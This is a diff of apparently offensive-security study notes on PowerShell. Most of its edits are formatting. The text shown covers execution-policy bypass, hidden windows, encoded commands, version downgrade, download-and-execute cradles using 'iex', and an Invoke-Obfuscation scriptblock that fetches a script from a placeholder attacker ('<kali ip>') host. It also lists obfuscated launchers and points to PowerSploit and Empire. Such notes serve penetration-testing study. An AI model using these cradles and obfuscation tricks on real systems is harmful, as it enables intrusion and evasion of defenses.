@@ -19,9 +19,10 @@ toc: true
 
 # Fundamentals
 
-Some Tools
-https://github.com/PowerShellMafia/PowerSploit
-https://github.com/powershell/powershell
+Some Tools:
+
+   → https://github.com/PowerShellMafia/PowerSploit
+   → https://github.com/powershell/powershell
 
 ## The Powershell CLI
 	CLI = Command Line Interface
@@ -62,14 +63,14 @@ powershell.exe -ExecutionPolicy Bypass .\script.ps1
 powershell.exe -ExecutionPolicy Unrestricted .\script,ps1
 ```
 
-- WindowStyle
+-WindowStyle
 Hides the Powershell window when used the "hidden" argument
 
 ```powershell
 powershell.exe -WindowStyle Hidden .\script.ps1
 ```
 
-- Command
+-Command
 Is used to specify a Command or Script Block to run.
 
 ```powershell
@@ -77,14 +78,14 @@ powershell.exe -Command Get-Process
 powershell.exe -Command "& { Get-EventLog -LogName security } "
 ```
 
-- EncodedCommand
+-EncodedCommand
 is used to execute base64 encoded scripts or commands
 
 ```powershell
 powershell.exe -EncodedCommand $encodedCommand
 ```
 
-- NoProfile
+-NoProfile
 Dont load any powershell profiles
 Profiles are essentially scripts that run when the powershell executable is launched and can interfere with our operations.
 
@@ -92,10 +93,11 @@ Profiles are essentially scripts that run when the powershell executable is laun
 powershell.exe -NoProfile .\script.ps1
 ```
 
-- Version
+-Version
 we can use followed by a version number as the argument to downgrade the version of powershell
 Useful in scenarios where you have landed on a machine with a more recent version and need to downgrade to Version 1.0 or 2.0 to complete certain tasks.
-	Requires that older versions are still installed on the target
+
+   → Requires that older versions are still installed on the target
 
 ```powershell
 powershell.exe -Version 2
@@ -109,7 +111,7 @@ powershell.exe -Version 2
 ```
 
 ### Get-Help
-Similar to linux "Man Pages"
+Similar to linux **Man Pages**
 we can use to obtain information related to any function, alias, module or cmdlet that PowerShell is aware of.
 
 To get full help For any cmdlet, which includes detailed information on associated parameters
@@ -127,7 +129,7 @@ To show Help pages online
 Get-Help Get-Help -Online
 ```
 
-to update the help files
+To update the help files
 ```powershell
 Update-Help
 ```
@@ -139,9 +141,6 @@ it allows us to list all cmdlets, aliases, functions, workflows, filters, script
 ```powershell
 Get-Command -Name *Firewall*
 ```
-
-
-
 
 ## Cmdlets
 Command-lets
@@ -156,7 +155,7 @@ Typically used to return output to other cmdlets to be then processed via a pipe
 Get-ChildItem
 ```
 
-returns 4 columns names Mode, LastWriteTime, Length and Name.
+Returns 4 columns names Mode, LastWriteTime, Length and Name.
 But we can pipe the output 
 ```powershell
 Get-ChildItem | Format-List *
@@ -302,13 +301,14 @@ directory which is used to contain all of the above
 
 ### Types
 script modules:
-	https://docs.microsoft.com/en-us/powershell/scripting/developer/module/how-to-write-a-powershell-script-module?view=powershell-7
+
+   → https://docs.microsoft.com/en-us/powershell/scripting/developer/module/how-to-write-a-powershell-script-module?view=powershell-7
 binary modules:
-	https://docs.microsoft.com/en-us/powershell/scripting/developer/module/how-to-write-a-powershell-binary-module?view=powershell-7
+   → https://docs.microsoft.com/en-us/powershell/scripting/developer/module/how-to-write-a-powershell-binary-module?view=powershell-7
 manifest modules:
-	https://docs.microsoft.com/en-us/powershell/scripting/developer/module/how-to-write-a-powershell-module-manifest?view=powershell-7
+   → https://docs.microsoft.com/en-us/powershell/scripting/developer/module/how-to-write-a-powershell-module-manifest?view=powershell-7
 dynamic modules: 
-	http://go.microsoft.com/fwlink/?LinkId=141554
+   → http://go.microsoft.com/fwlink/?LinkId=141554
 
 ### Get-Module
 to obtain a list of all currently imported modules 
@@ -455,7 +455,11 @@ Get-Process | Get-Member -MemberType Method
 ```
 
 1. we have identified an object (in this case, a process **firefox**) we would like to manipulate in some way using the Get-Process cmdlet
-2. We have determined the methods that are available For use with the objects that were returned by using the Get-Process | Get-Member cmdlet and pipeline
+2. We have determined the methods that are available For use with the objects that were returned by using: 
+```powershell
+Get-Process | Get-Member cmdlet and pipeline
+```
+
 3. We have decided that the Kill method is the method we would like to use For that process( as an example)
 
 ```powershell
@@ -697,6 +701,7 @@ iex $downloader.responseText
 ```
 
 - We can do the same with WinHttp.WinHttpRequest.5.1 object as well (in the first line)
+
 ```powershell
 
 $downloader = New-Object -ComObject WinHttp.WinHttpRequest.5.1
@@ -739,12 +744,14 @@ Invoke-Obfuscation = https://github.com/danielbohannon/Invoke-Obfuscation
 ```
 
 ### We have several options
+```
 TOKEN
 AST
 STRING
 ENCODING
 COMPRESS
 LAUNCHER
+```
 
 ### SET SCRIPTBLOCK
 
@@ -755,7 +762,7 @@ SET SCRIPTBLOCK iex (New-Object Net.WebClient).downloadstring("http://<kali ip>/
 
 ### Type of Obfuscation
 
-→ STRING
+#### STRING
 
 We are presented with several options For that method:
 	1. Concatenate
@@ -795,8 +802,22 @@ powershell -Command "<the same payload>"
 
 ### Obfuscated launcher
  → LAUNCHER
-there is a lot of options
-ps, cmd, wmic, rundll, var+, stdin+, clip+, var++, stdin++, clip++, rundll++, mshta++
+there is a lot of options:
+
+```
+ps
+cmd
+wmic
+rundll
+var+
+stdin+
+clip+
+var++
+stdin++
+clip++
+rundll++
+mshta++
+```
 
 1. We SET SCRIPTBLOCK with the code we want to execute
 2. We select an obfuscation method to generate the obfuscated command
@@ -1184,7 +1205,8 @@ in Empire:
 ## Empire Overview
 
 ### Install
-	https://github.com/EmpireProject/Empire
+- https://github.com/EmpireProject/Empire
+
 ```powershell
 git clone <url>
 cd Empire > cd setup > ./install.sh
